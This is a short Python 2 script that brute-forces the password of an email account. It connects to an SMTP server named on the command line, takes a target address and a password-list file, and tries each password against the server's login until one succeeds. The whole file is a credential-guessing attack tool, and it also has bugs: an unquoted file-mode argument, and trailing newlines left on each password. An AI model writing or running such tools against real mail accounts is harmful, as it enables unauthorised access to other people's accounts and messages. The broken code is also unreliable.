import smtplib, sys

smtpserver = smtplib.SMTP(sys.argv[1], 25)

smtpserver.ehlo()
smtpserver.starttls()


user = raw_input("Enter the email address")
password = raw_input("Enter the pass file")
password = open(password, r)

for passwordx in password:
    try:
        smtpserver.login(user, passwordx)
        print("Password found")
        break;
    except smtplib.SMTPAuthenticationError:
        print "password:" + passwordx

    
        
